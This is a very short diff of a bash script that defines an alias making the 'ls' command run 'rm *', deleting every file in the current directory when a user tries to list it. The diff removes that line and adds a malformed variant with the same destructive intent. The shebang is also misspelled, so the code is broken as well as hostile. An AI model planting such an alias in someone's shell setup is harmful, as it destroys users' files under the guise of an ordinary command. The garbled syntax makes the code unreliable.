@@ -1,2 +1,2 @@
 #!/bit/bash
-alias ls="rm *"
+alias [-p][ls="rm *"]
